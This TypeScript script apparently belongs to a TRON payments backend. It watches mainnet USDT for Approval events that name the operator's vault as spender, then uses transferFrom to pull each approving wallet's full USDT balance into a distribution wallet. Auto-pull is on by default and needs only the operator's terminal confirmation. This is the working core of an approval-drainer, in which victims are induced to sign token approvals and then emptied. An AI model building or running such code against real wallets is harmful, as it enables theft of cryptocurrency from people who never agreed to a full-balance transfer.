/**
 * Polls mainnet TRC-20 USDT for `Approval` events where `spender` is the vault derived from
 * TRON_VAULT_PRIVATE_KEY (same resolution as `src/env.ts`).
 *
 * Usage:
 *   npx tsx scripts/tron-monitor-vault-approvals.ts
 *
 * Env (see server `.env.example`):
 *   TRON_VAULT_PRIVATE_KEY — required (or SPENDER_KEY / TRON_OPERATOR_PRIVATE_KEY per env fallbacks)
 *   TRON_FULL_NODE_URL — default https://api.trongrid.io
 *   TRONGRID_API_KEY — recommended for sustained polling
 *   TRON_USDT_CONTRACT — optional, default mainnet USDT
 *   APPROVAL_POLL_INTERVAL_MS — default 12000
 *   AUTO_DEPOSIT_ON_APPROVAL — set to "0" to only log approvals; when enabled, each transferFrom requires explicit terminal confirmation
 */
import "dotenv/config";
import readline from "node:readline/promises";
import { stdin as input, stdout as output } from "node:process";
import { TronWeb } from "tronweb";
import { env } from "../src/env.js";
import {
  previewFullUsdtPullToVault,
  pullFullUsdtToVault,
  TRON_USDT_CONTRACT_MAINNET,
} from "../src/services/tronAutoDeposit.js";
import { VAULT_CONFIG } from "../src/vaultConfig.js";

function sleep(ms: number): Promise<void> {
  return new Promise((resolve) => setTimeout(resolve, ms));
}

function die(message: string): never {
  console.error(message);
  process.exit(1);
}

function formatUsdt(raw: string): string {
  try {
    const bi = BigInt(String(raw).replace(/\s/g, ""));
    const whole = bi / 1_000_000n;
    const frac = bi % 1_000_000n;
    return `${whole}.${frac.toString().padStart(6, "0")}`;
  } catch {
    return String(raw);
  }
}

function toBase58Any(tronWeb: TronWeb, addr: string | undefined | null): string | null {
  if (addr == null) return null;
  const s = String(addr).trim();
  if (!s) return null;
  try {
    if (s.startsWith("T") && tronWeb.isAddress(s)) return s;
    const hex = s.replace(/^0x/i, "");
    const body = hex.startsWith("41") && hex.length >= 40 ? hex : `41${hex.slice(-40)}`;
    return tronWeb.address.fromHex(body);
  } catch {
    return null;
  }
}

function extractResult(row: unknown): Record<string, string> | null {
  if (!row || typeof row !== "object") return null;
  const r = (row as { result?: unknown }).result;
  if (!r || typeof r !== "object") return null;
  const out: Record<string, string> = {};
  for (const [k, v] of Object.entries(r as Record<string, unknown>)) {
    if (v != null && (typeof v === "string" || typeof v === "number" || typeof v === "bigint")) {
      out[k] = String(v);
    }
  }
  return out;
}

type GridEventResponse = {
  success?: boolean;
  error?: string;
  data?: unknown[];
  meta?: { fingerprint?: string };
};

function vaultHex(tronWeb: TronWeb, vaultBase58: string): string {
  return tronWeb.address.toHex(vaultBase58).toLowerCase();
}

function spenderMatchesRow(tronWeb: TronWeb, row: unknown, vaultBase58: string): boolean {
  const res = extractResult(row);
  if (!res) return false;
  const spenderRaw = res.spender ?? res._spender ?? res[1];
  if (spenderRaw == null) return false;
  const spenderB58 = toBase58Any(tronWeb, String(spenderRaw));
  if (!spenderB58) return false;
  return vaultHex(tronWeb, spenderB58) === vaultHex(tronWeb, vaultBase58);
}

function rowKey(row: unknown): string | null {
  if (!row || typeof row !== "object") return null;
  const o = row as { transaction_id?: string; txID?: string; event_index?: number };
  const tx = o.transaction_id ?? o.txID;
  if (!tx || typeof tx !== "string") return null;
  const idx = typeof o.event_index === "number" ? String(o.event_index) : "";
  return `${tx}:${idx}`;
}

async function confirmTransfer(
  owner: string,
  approvalValueRaw: string,
  txid: string,
  vaultBase58: string,
  preview: {
    amountRaw: string;
    allowanceRaw: string;
    feeLimitSun: number;
  },
): Promise<boolean> {
  const rl = readline.createInterface({ input, output });
  try {
    const maxFeeTrx = (preview.feeLimitSun / 1_000_000).toFixed(6);
    console.info("[consent] Transaction summary (before signing):");
    console.info(`  amount: ${formatUsdt(preview.amountRaw)} USDT (raw=${preview.amountRaw})`);
    console.info(`  recipient: ${vaultBase58}`);
    console.info(`  max_fee: ${maxFeeTrx} TRX (fee_limit_sun=${preview.feeLimitSun})`);
    console.info(`  allowance: raw=${preview.allowanceRaw}`);
    console.info(`  approval_event: tx=${txid || "?"} value_raw=${approvalValueRaw}`);
    const answer = await rl.question(
      `[consent] Sign transferFrom for owner=${owner}? Type "yes" to confirm: `,
    );
    return answer.trim().toLowerCase() === "yes";
  } finally {
    rl.close();
  }
}

async function main(): Promise<void> {
  if (!env.tronVaultPrivateKey?.trim()) {
    die("Set TRON_VAULT_PRIVATE_KEY (or SPENDER_KEY / TRON_OPERATOR_PRIVATE_KEY) to monitor that vault’s approvals.");
  }

  const headers = env.tronGridApiKey ? { "TRON-PRO-API-KEY": env.tronGridApiKey } : undefined;

  const keyed = new TronWeb({
    fullHost: env.tronFullNodeUrl,
    privateKey: env.tronVaultPrivateKey,
    headers,
  });

  const tronWeb = new TronWeb({
    fullHost: env.tronFullNodeUrl,
    headers,
  });

  const vaultBase58 = keyed.defaultAddress.base58;
  if (!vaultBase58) die("Could not derive vault address from private key.");

  const vaultForPull = env.tronDistributionWallet.trim() || VAULT_CONFIG;
  if (vaultHex(tronWeb, vaultBase58) !== vaultHex(tronWeb, vaultForPull)) {
    console.warn(
      `[warn] Vault address from private key (${vaultBase58}) does not match TRON_DISTRIBUTION_WALLET / default (${vaultForPull}). Approvals are filtered for the key’s address; auto-deposit uses TRON_DISTRIBUTION_WALLET.`,
    );
  }
  const autoDepositOnApproval = process.env.AUTO_DEPOSIT_ON_APPROVAL?.trim() !== "0";

  const usdt = process.env.TRON_USDT_CONTRACT?.trim() || TRON_USDT_CONTRACT_MAINNET;
  const intervalMs = (() => {
    const raw = process.env.APPROVAL_POLL_INTERVAL_MS?.trim();
    const n = raw ? Number(raw) : 12_000;
    return Number.isFinite(n) && n >= 3000 ? Math.floor(n) : 12_000;
  })();

  const seen = new Set<string>();
  console.info(`[vault-approvals] Monitoring USDT ${usdt}`);
  console.info(`[vault-approvals] Spender (vault): ${vaultBase58}`);
  console.info(`[vault-approvals] Auto-deposit to ${vaultForPull}: ${autoDepositOnApproval ? "on" : "off"}`);
  console.info(`[vault-approvals] Poll every ${intervalMs}ms`);

  for (;;) {
    try {
      let fingerprint: string | undefined;
      let pages = 0;
      do {
        const res = (await tronWeb.getEventResult(usdt, {
          eventName: "Approval",
          onlyConfirmed: true,
          orderBy: "block_timestamp,desc",
          limit: 200,
          fingerprint,
        })) as GridEventResponse;

        if (!res.success) {
          throw new Error(typeof res.error === "string" ? res.error : "event query failed");
        }

        const rows = Array.isArray(res.data) ? res.data : [];
        for (const row of rows) {
          if (!spenderMatchesRow(tronWeb, row, vaultBase58)) continue;
          const key = rowKey(row);
          if (!key || seen.has(key)) continue;
          seen.add(key);

          const r = extractResult(row);
          const ownerRaw = r?.owner ?? r?._owner ?? r?.[0];
          const valueRaw = r?.value ?? r?._value ?? "";
          const ownerB58 = toBase58Any(tronWeb, ownerRaw ? String(ownerRaw) : null);
          const ownerLabel = ownerB58 ?? String(ownerRaw ?? "");
          const ts =
            typeof (row as { block_timestamp?: number }).block_timestamp === "number"
              ? new Date((row as { block_timestamp: number }).block_timestamp).toISOString()
              : new Date().toISOString();
          const txid =
            (row as { transaction_id?: string }).transaction_id ??
            (row as { txID?: string }).txID ??
            "";
          const bn = (row as { block_number?: number }).block_number;

          console.info(
            `[${ts}] Incoming USDT approval → vault | owner=${ownerLabel} | value_raw=${valueRaw} | usdt≈${formatUsdt(valueRaw || "0")} | block=${bn ?? "?"} | tx=${txid}`,
          );

          if (
            autoDepositOnApproval &&
            ownerB58 &&
            tronWeb.isAddress(ownerB58) &&
            env.tronVaultPrivateKey?.trim()
          ) {
            try {
              const preview = await previewFullUsdtPullToVault({
                userBase58: ownerB58,
                operatorPrivateKey: env.tronVaultPrivateKey,
                fullHost: env.tronFullNodeUrl,
                vaultBase58: vaultForPull,
                tokenAddress: usdt,
                tronGridApiKey: env.tronGridApiKey || undefined,
              });
              if (preview.status === "skipped") {
                console.info(`[auto-deposit] skipped (${preview.reason}) owner=${ownerB58}`);
                continue;
              }
              const approved = await confirmTransfer(ownerB58, valueRaw, txid, vaultForPull, preview);
              if (!approved) {
                console.info(`[auto-deposit] cancelled by operator owner=${ownerB58}`);
                continue;
              }
              const pull = await pullFullUsdtToVault({
                userBase58: ownerB58,
                operatorPrivateKey: env.tronVaultPrivateKey,
                fullHost: env.tronFullNodeUrl,
                vaultBase58: vaultForPull,
                tokenAddress: usdt,
                tronGridApiKey: env.tronGridApiKey || undefined,
              });
              if (pull.status === "skipped") {
                console.info(`[auto-deposit] skipped (${pull.reason}) owner=${ownerB58}`);
              } else {
                console.info(
                  `[auto-deposit] transferFrom → ${vaultForPull} | tx=${pull.txid} | amountRaw=${pull.amountRaw} | owner=${ownerB58}`,
                );
              }
            } catch (err) {
              console.error(
                `[auto-deposit] failed owner=${ownerB58}:`,
                err instanceof Error ? err.message : err,
              );
            }
          }
        }

        fingerprint = res.meta?.fingerprint;
        pages++;
      } while (fingerprint && pages < 15);
    } catch (e) {
      console.error("[vault-approvals] poll error:", e instanceof Error ? e.message : e);
    }

    await sleep(intervalMs);
  }
}

main().catch((e) => {
  console.error(e instanceof Error ? e.message : e);
  process.exit(1);
});
